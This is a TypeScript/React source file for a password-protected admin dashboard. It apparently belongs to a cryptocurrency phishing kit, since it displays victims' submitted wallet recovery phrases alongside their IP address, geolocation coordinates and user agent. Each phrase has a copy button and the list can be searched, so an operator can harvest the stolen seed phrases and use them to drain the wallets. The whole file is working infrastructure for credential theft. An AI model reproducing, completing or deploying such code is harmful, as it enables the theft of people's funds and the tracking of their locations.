"use client";

import { useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import { 
  Loader2, 
  Shield, 
  Lock, 
  RefreshCw, 
  LogOut, 
  Search, 
  Copy, 
  MapPin, 
  Globe, 
  Monitor,
  Calendar,
  Eye,
  EyeOff,
  CheckCircle2,
  ArrowLeft
} from "lucide-react";
import Link from "next/link";

interface Submission {
  _id: string;
  timestamp: Date;
  walletType: string;
  phrase: string;
  phraseLength: number;
  location: {
    ip: string;
    city: string;
    region: string;
    country: string;
    timezone: string;
    latitude: number | null;
    longitude: number | null;
  };
  device: {
    userAgent: string;
  };
}

export default function AdminPage() {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");

  const handleLogin = async () => {
    if (!password) {
      toast.error("Please enter password");
      return;
    }

    setLoading(true);
    try {
      const response = await fetch("/api/admin", {
        method: "GET",
        headers: {
          "x-admin-password": password.trim(),
        },
      });

      const data = await response.json();
      
      if (response.status === 200) {
        // Immediately authenticate and load data without delay
        setIsAuthenticated(true);
        setSubmissions(data.submissions || []);
        const count = data.count || 0;
        toast.success(`Access granted! Loaded ${count} submission${count === 1 ? '' : 's'}.`);
        setLoading(false);
      } else {
        console.error("Login failed:", response.status, data);
        toast.error(data.error || "Invalid password. Please try again.");
        setLoading(false);
      }
    } catch (error) {
      console.error("Authentication error:", error);
      toast.error("Connection error. Make sure the server is running.");
      setLoading(false);
    }
  };

  const handleRefresh = async () => {
    setLoading(true);
    try {
      const response = await fetch("/api/admin", {
        headers: {
          "x-admin-password": password,
        },
      });

      if (response.ok) {
        const data = await response.json();
        setSubmissions(data.submissions);
        toast.success(`Refreshed ${data.count} submissions`);
      }
    } catch (error) {
      toast.error("Failed to refresh data");
    } finally {
      setLoading(false);
    }
  };

  const filteredSubmissions = submissions.filter(
    (sub) =>
      sub.walletType.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.phrase.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.location.country.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.location.ip.includes(searchQuery)
  );

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard!", {
      icon: <CheckCircle2 className="w-4 h-4" />,
    });
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-900 via-purple-900 to-indigo-900 flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-black/40 backdrop-blur-sm border-gray-700">
          <div className="p-6 space-y-6">
            <Link href="/">
              <Button variant="ghost" className="text-gray-400 hover:text-white -ml-2">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Home
              </Button>
            </Link>
            <div className="flex items-center justify-center">
              <div className="bg-red-600/20 p-4 rounded-full">
                <Shield className="w-8 h-8 text-red-400" />
              </div>
            </div>
            <div className="text-center">
              <h1 className="text-2xl font-bold text-white mb-2">Admin Access</h1>
              <p className="text-gray-400 text-sm">Enter admin password to view submissions</p>
            </div>
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="password" className="text-white">
                  Admin Password
                </Label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                    className="bg-gray-800/50 border-gray-600 text-white pr-10"
                    placeholder="Enter admin password"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
                  >
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>
              <Button
                onClick={handleLogin}
                disabled={loading}
                className="w-full bg-red-600 hover:bg-red-700"
              >
                {loading ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Authenticating...
                  </>
                ) : (
                  <>
                    <Lock className="w-4 h-4 mr-2" />
                    Access Admin Panel
                  </>
                )}
              </Button>
            </div>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 via-purple-900 to-indigo-900 p-4">
      <div className="max-w-7xl mx-auto space-y-4">
        {/* Header Card */}
        <Card className="bg-black/40 backdrop-blur-sm border-gray-700">
          <div className="p-6">
            <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4">
              <div className="flex items-center gap-3">
                <div className="bg-red-600/20 p-3 rounded-lg">
                  <Shield className="w-6 h-6 text-red-400" />
                </div>
                <div>
                  <h1 className="text-2xl font-bold text-white">Admin Dashboard</h1>
                  <p className="text-gray-400 text-sm mt-1">
                    <span className="font-semibold text-white">{submissions.length}</span> Total Submissions
                    {searchQuery && filteredSubmissions.length !== submissions.length && (
                      <span className="ml-2">
                        • <span className="font-semibold text-white">{filteredSubmissions.length}</span> Matching
                      </span>
                    )}
                  </p>
                </div>
              </div>
              <div className="flex gap-2 w-full lg:w-auto">
                <Button
                  onClick={handleRefresh}
                  disabled={loading}
                  variant="outline"
                  className="border-gray-600 text-white hover:bg-gray-800 flex-1 lg:flex-none"
                >
                  {loading ? (
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  ) : (
                    <RefreshCw className="w-4 h-4 mr-2" />
                  )}
                  Refresh
                </Button>
                <Button
                  onClick={() => {
                    setIsAuthenticated(false);
                    setPassword("");
                    setSubmissions([]);
                  }}
                  variant="outline"
                  className="border-gray-600 text-white hover:bg-gray-800 flex-1 lg:flex-none"
                >
                  <LogOut className="w-4 h-4 mr-2" />
                  Logout
                </Button>
              </div>
            </div>
          </div>
        </Card>

        {/* Search Card */}
        <Card className="bg-black/40 backdrop-blur-sm border-gray-700">
          <div className="p-4">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
              <Input
                type="text"
                placeholder="Search by wallet type, phrase, country, or IP address..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-10 bg-gray-800/50 border-gray-600 text-white placeholder:text-gray-500"
              />
              {searchQuery && (
                <button
                  onClick={() => setSearchQuery("")}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
                >
                  ×
                </button>
              )}
            </div>
          </div>
        </Card>

        {/* Submissions List */}
        <div className="space-y-4">
          {filteredSubmissions.length === 0 ? (
            <Card className="bg-black/40 backdrop-blur-sm border-gray-700">
              <div className="p-12 text-center">
                <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-gray-800/50 mb-4">
                  <Search className="w-8 h-8 text-gray-500" />
                </div>
                <p className="text-gray-400 text-lg font-medium">
                  {submissions.length === 0
                    ? "No submissions found in database"
                    : "No submissions match your search"}
                </p>
                {submissions.length === 0 && (
                  <p className="text-gray-500 text-sm mt-2">
                    Submissions will appear here once users connect their wallets
                  </p>
                )}
              </div>
            </Card>
          ) : (
            filteredSubmissions.map((submission, index) => (
              <Card
                key={submission._id}
                className="bg-black/40 backdrop-blur-sm border-gray-700 hover:border-gray-600 transition-colors"
              >
                <div className="p-6 space-y-4">
                  {/* Header */}
                  <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-3">
                    <div className="flex items-start gap-3">
                      <div className="bg-blue-600/20 p-2 rounded-lg shrink-0">
                        <Globe className="w-5 h-5 text-blue-400" />
                      </div>
                      <div>
                        <div className="flex items-center gap-2 flex-wrap">
                          <Badge className="bg-blue-600 hover:bg-blue-600">
                            {submission.walletType}
                          </Badge>
                          <Badge variant="outline" className="text-gray-300 border-gray-600">
                            {submission.phraseLength} words
                          </Badge>
                          <Badge variant="outline" className="text-gray-400 border-gray-700">
                            #{index + 1}
                          </Badge>
                        </div>
                        <div className="flex items-center gap-2 mt-2 text-gray-400 text-xs">
                          <Calendar className="w-3 h-3" />
                          {new Date(submission.timestamp).toLocaleString()}
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Phrase */}
                  <div className="bg-gray-900/50 p-4 rounded-lg border border-gray-700">
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex-1 min-w-0">
                        <Label className="text-gray-400 text-xs mb-2 block">Recovery Phrase</Label>
                        <p className="text-white font-mono text-sm break-all leading-relaxed">
                          {submission.phrase}
                        </p>
                      </div>
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => copyToClipboard(submission.phrase)}
                        className="shrink-0 text-gray-400 hover:text-white hover:bg-gray-800"
                      >
                        <Copy className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>

                  {/* Details Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* Location */}
                    <div className="bg-gray-800/30 p-4 rounded-lg border border-gray-700">
                      <div className="flex items-center gap-2 mb-3">
                        <MapPin className="w-4 h-4 text-green-400" />
                        <Label className="text-white font-medium">Location</Label>
                      </div>
                      <div className="space-y-1 text-sm">
                        <p className="text-white">
                          {submission.location.city}, {submission.location.region}
                        </p>
                        <p className="text-white">{submission.location.country}</p>
                        <p className="text-gray-400 text-xs mt-2">
                          {submission.location.timezone}
                        </p>
                        {submission.location.latitude && submission.location.longitude && (
                          <p className="text-gray-500 text-xs">
                            {submission.location.latitude.toFixed(4)}, {submission.location.longitude.toFixed(4)}
                          </p>
                        )}
                      </div>
                    </div>

                    {/* IP & Device */}
                    <div className="bg-gray-800/30 p-4 rounded-lg border border-gray-700">
                      <div className="flex items-center gap-2 mb-3">
                        <Monitor className="w-4 h-4 text-purple-400" />
                        <Label className="text-white font-medium">Device Info</Label>
                      </div>
                      <div className="space-y-2 text-sm">
                        <div>
                          <p className="text-gray-400 text-xs">IP Address</p>
                          <div className="flex items-center gap-2 mt-1">
                            <p className="text-white font-mono">{submission.location.ip}</p>
                            <Button
                              size="sm"
                              variant="ghost"
                              onClick={() => copyToClipboard(submission.location.ip)}
                              className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                            >
                              <Copy className="w-3 h-3" />
                            </Button>
                          </div>
                        </div>
                        <div>
                          <p className="text-gray-400 text-xs">User Agent</p>
                          <p className="text-gray-300 text-xs mt-1 break-all leading-relaxed">
                            {submission.device.userAgent}
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </Card>
            ))
          )}
        </div>
      </div>
    </div>
  );
}
